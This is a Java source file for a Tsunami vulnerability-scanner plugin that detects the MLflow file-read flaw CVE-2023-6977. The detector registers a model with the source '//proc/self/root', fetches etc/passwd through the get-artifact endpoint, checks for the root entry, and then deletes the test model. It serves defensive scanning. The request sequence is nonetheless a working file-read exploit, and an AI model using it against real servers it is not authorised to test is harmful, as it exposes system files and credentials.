/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve20236977;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.delete;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2023-6977 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "MLflow LFI/RFI CVE-2023-6977 Detector",
    version = "0.2",
    description = Cve20236977Detector.VULN_DESCRIPTION,
    author = "hh-hunter, frkngksl",
    bootstrapModule = Cve20236977DetectorBootstrapModule.class)
public final class Cve20236977Detector implements VulnDetector {

  @VisibleForTesting static final String DETECTION_STRING = "root:x:0:0:root";
  @VisibleForTesting static final String CREATE_DETECTION_STRING = "Tsunami-Test";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "mlflow is a platform to streamline machine learning development, including tracking"
          + " experiments, packaging code into reproducible runs, and sharing and deploying models."
          + " Affected versions of this package are vulnerable to Improper Access Control which"
          + " enables malicious actors to download arbitrary files unrelated to MLflow from the"
          + " host server, including any files stored in remote locations to which the host server"
          + " has access.This vulnerability can read arbitrary files. Since MLflow usually"
          + " configures s3 storage, it means that AWS account information can also be obtained,"
          + " and information such as local ssh private keys can also be read, resulting in RCE."
          + " The vulnerability detected here is CVE-2023-6977 which is a bypass for both"
          + " CVE-2023-1177 and CVE-2023-2780. Hence, this plugin encompasses them.";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String REPLACE_FLAG = "REPLACE_FLAG";
  private static final String CREATE_MODEL_API = "ajax-api/2.0/mlflow/registered-models/create";

  private static final String UPDATE_MODEL_API = "ajax-api/2.0/mlflow/model-versions/create";
  private static final String REMOVE_MODEL_API = "ajax-api/2.0/mlflow/model-versions/delete";

  private static final String READ_FILE_VUL_API =
      "model-versions/get-artifact?path=etc/passwd&name=REPLACE_FLAG&version=1";

  private static final String CREATE_MODEL_DATA = "{\"name\":\"REPLACE_FLAG\"}";

  private static final String UPDATE_CREATE_MODEL_DATA =
      "{\"name\":\"REPLACE_FLAG\",\"source\":\"//proc/self/root\"}";

  private final HttpClient httpClient;

  private final Clock utcClock;

  @Inject
  Cve20236977Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-6977 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Boolean createFlag = false;
    Boolean resultFlag = false;
    String currentModelName = CREATE_DETECTION_STRING + Instant.now().toEpochMilli();
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String createModeUri = new StringBuilder().append(rootUri).append(CREATE_MODEL_API).toString();
    String updateModeUri = new StringBuilder().append(rootUri).append(UPDATE_MODEL_API).toString();
    String readFileUri =
        new StringBuilder()
            .append(rootUri)
            .append(READ_FILE_VUL_API)
            .toString()
            .replace(REPLACE_FLAG, currentModelName);
    logger.atInfo().log("currentModelName: %s", currentModelName);
    try {
      HttpResponse createModeResponse =
          httpClient.sendAsIs(
              post(createModeUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(
                          CREATE_MODEL_DATA.replace(REPLACE_FLAG, currentModelName)))
                  .build());
      if (createModeResponse.status().code() != 200
          && !createModeResponse.bodyString().get().contains(CREATE_DETECTION_STRING)) {
        return false;
      }
      createFlag = true;
      HttpResponse updateModeResponse =
          httpClient.sendAsIs(
              post(updateModeUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(
                          UPDATE_CREATE_MODEL_DATA.replace(REPLACE_FLAG, currentModelName)))
                  .build());
      if (updateModeResponse.status().code() == 200
          && updateModeResponse.bodyString().get().contains(CREATE_DETECTION_STRING)) {
        {
          HttpResponse readFileResponse =
              httpClient.sendAsIs(
                  get(readFileUri)
                      .setHeaders(
                          HttpHeaders.builder()
                              .addHeader(USER_AGENT, CREATE_DETECTION_STRING)
                              .build())
                      .build());
          if (readFileResponse.status().code() == 200
              && readFileResponse.bodyString().get().contains(DETECTION_STRING)) {
            resultFlag = true;
          }
        }
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    } finally {
      if (createFlag) {
        cleanModel(currentModelName, networkService);
      }
    }
    return resultFlag;
  }

  private void cleanModel(String modelName, NetworkService networkService) {
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String removeModeUri = new StringBuilder().append(rootUri).append(REMOVE_MODEL_API).toString();
    try {
      HttpResponse removeModeResponse =
          httpClient.sendAsIs(
              delete(removeModeUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(CREATE_MODEL_DATA.replace(REPLACE_FLAG, modelName)))
                  .build());
      if (removeModeResponse.status().code() == 200) {
        logger.atInfo().log("Clean Model %s success", modelName);
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Clean Model %s failed", modelName);
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_6977"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-6977"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-2780"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-1177"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-6977 MLflow LFI/RFI")
                .setRecommendation(
                    "1.Update to the version 2.10.0 or above\n"
                        + "2.Add authentication to MLflow server\n")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
